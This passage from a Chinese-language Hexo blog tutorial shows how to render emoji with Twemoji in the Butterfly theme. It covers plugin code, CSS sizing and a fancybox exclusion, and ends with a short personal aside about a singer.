id="安裝Twemoji">安裝Twemoji</h4><p>修改<code>node_modules/markdown-it-emoji/index.js</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> emojies_defs      = <span class="built_in">require</span>(<span class="string">'./lib/data/full.json'</span>);</span><br><span class="line"><span class="keyword">var</span> emojies_shortcuts = <span class="built_in">require</span>(<span class="string">'./lib/data/shortcuts'</span>);</span><br><span class="line"><span class="keyword">var</span> emoji_html        = <span class="built_in">require</span>(<span class="string">'./lib/render'</span>);</span><br><span class="line"><span class="keyword">var</span> emoji_replace     = <span class="built_in">require</span>(<span class="string">'./lib/replace'</span>);</span><br><span class="line"><span class="keyword">var</span> normalize_opts    = <span class="built_in">require</span>(<span class="string">'./lib/normalize_opts'</span>);</span><br><span class="line"><span class="keyword">var</span> twemoji           = <span class="built_in">require</span>(<span class="string">'twemoji'</span>) <span class="comment">//宣告變數</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">emoji_plugin</span>(<span class="params">md, options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> defaults = &#123;</span><br><span class="line">    defs: emojies_defs,</span><br><span class="line">    shortcuts: emojies_shortcuts,</span><br><span class="line">    enabled: []</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> opts = normalize_opts(md.utils.assign(&#123;&#125;, defaults, options || &#123;&#125;));</span><br><span class="line"></span><br><span class="line">  md.renderer.rules.emoji = emoji_html;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用 twemoji 渲染</span></span><br><span class="line">  md.renderer.rules.emoji = <span class="function"><span class="keyword">function</span>(<span class="params">token, idx</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> twemoji.parse(token[idx].content);</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  md.core.ruler.push(<span class="string">'emoji'</span>, emoji_replace(md, opts.defs, opts.shortcuts, opts.scanRE, opts.replaceRE));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><h3 id="第四步">第四步</h3><h4 id="調整尺寸">調整尺寸</h4><p>這裡我參考了這兩篇文章的css內容<br><a href="https://io-oi.me/tech/hexo-next-optimization/#bb---for---bb" target="_blank" rel="noopener">打造个性超赞博客 Hexo + NexT + GitHub Pages 的超深度优化 | reuixiy</a><br><a href="https://www.wakasann.com/2016/10/03/hexoaddemoji/" target="_blank" rel="noopener">Hexo中添加emoji表情 | wakasann Croner</a><br>融合出了一下內容</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">css</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//emoji</span><br><span class="line"><span class="selector-tag">img</span><span class="selector-class">.emoji</span> &#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">1.5em</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">1.5em</span>;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0.05em</span> <span class="number">0.1em</span>;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">0px</span>;</span><br><span class="line"><span class="attribute">display</span>: inline <span class="meta">!important</span>;</span><br><span class="line"><span class="attribute">vertical-align</span>: -<span class="number">1.5em</span>;</span><br><span class="line"><span class="attribute">border</span>: none;</span><br><span class="line"><span class="attribute">cursor</span>: text;</span><br><span class="line"><span class="attribute">box-shadow</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>直接在<code>\themes\Butterfly\source\css\index.styl</code>加入即可</p><h3 id="第五步">第五步</h3><h4 id="重頭戲來啦">重頭戲來啦</h4><p>因為我在博客中開啟了fancybox的緣故，文章裡面所有圖片都可以點開大<br>但是emoji被放大就不是好事了(廢話<br>那麼我們就得避免他被識別成要被fancybox處理的東西(外面被套一層a標籤)<br>因此我們得修改有關這個套件的內容<br>在<code>\themes\Butterfly\scripts\photo.js</code>我們可以找到</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (theme.fancybox.enable) &#123;</span><br><span class="line">  images.each(<span class="function">(<span class="params">i, o</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> lazyload_src = $(o).attr(<span class="string">'src'</span>) ? $(o).attr(<span class="string">'src'</span>) : $(o).attr(<span class="string">"data-src"</span>)</span><br><span class="line">    <span class="keyword">var</span> alt = $(o).attr(<span class="string">'alt'</span>)</span><br><span class="line">    <span class="keyword">if</span> (alt !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      $(o).attr(<span class="string">'title'</span>, alt)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> $a = $(</span><br><span class="line">      <span class="string">'&lt;a href="'</span> +</span><br><span class="line">      lazyload_src +</span><br><span class="line">      <span class="string">'" data-fancybox="group" data-caption="'</span> +</span><br><span class="line">      $(o).attr(<span class="string">'alt'</span>) +</span><br><span class="line">      <span class="string">'" class="fancybox"&gt;&lt;/a&gt;'</span></span><br><span class="line">    )</span><br><span class="line">    $(o).wrap($a)    </span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>要怎麼修改呢?，其實在開頭加入點東西忽略下就好，直接加入<code>.not('.emoji')</code>即可<br>結果如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (theme.fancybox.enable) &#123;</span><br><span class="line">  images.not(<span class="string">'.emoji'</span>).each(<span class="function">(<span class="params">i, o</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> lazyload_src = $(o).attr(<span class="string">'src'</span>) ? $(o).attr(<span class="string">'src'</span>) : $(o).attr(<span class="string">"data-src"</span>)</span><br><span class="line">    <span class="keyword">var</span> alt = $(o).attr(<span class="string">'alt'</span>)</span><br><span class="line">    <span class="keyword">if</span> (alt !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      $(o).attr(<span class="string">'title'</span>, alt)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> $a = $(</span><br><span class="line">      <span class="string">'&lt;a href="'</span> +</span><br><span class="line">      lazyload_src +</span><br><span class="line">      <span class="string">'" data-fancybox="group" data-caption="'</span> +</span><br><span class="line">      $(o).attr(<span class="string">'alt'</span>) +</span><br><span class="line">      <span class="string">'" class="fancybox"&gt;&lt;/a&gt;'</span></span><br><span class="line">    )</span><br><span class="line">    $(o).wrap($a)    </span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>這樣我們就能得到一個正常尺寸的emoji了<img class="emoji lazyload" draggable="false" alt="🎉" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f389.png" src="https://i.imgur.com/WS5Q2x3.gif"> <img class="emoji lazyload" draggable="false" alt="🎉" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f389.png" src="https://i.imgur.com/WS5Q2x3.gif"> <img class="emoji lazyload" draggable="false" alt="🎉" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f389.png" src="https://i.imgur.com/WS5Q2x3.gif"></p><h2 id="小結">小結</h2><p>雖說好像沒啥內容，不過希望這篇文章能幫到有需要的人嘛<img class="emoji lazyload" draggable="false" alt="🤔" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f914.png" src="https://i.imgur.com/WS5Q2x3.gif"><br>動手做開心多了，畢竟在這漫長的寒假沒啥事做</p><h2 id="題外話">題外話</h2><p>在打這篇文章的時候在聽這場直播存檔，實在是很喜歡yin的聲音呢，能拉高音，能唱很甜的歌，能用成熟的歌喉唱<br>但不知道為啥咪他的人氣都不高呢，希望他有一天能成為知名的翻唱歌手<img class="emoji lazyload" draggable="false" alt="💕" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f495.png" src="https://i.imgur.com/WS5Q2x3.gif"><br><strong>こんばんは～(niconico同時配信)</strong><br><a href="http://www.youtube.com/watch?v=rxjTLGJta9U" target="_blank" rel="noopener" title="こんばんは～(niconico同時配信)"><img alt data-src="https://img.youtube.com/vi/rxjTLGJta9U/0.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a></p>]]></content>
      
      
      <categories>
          
          <category> 教學 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
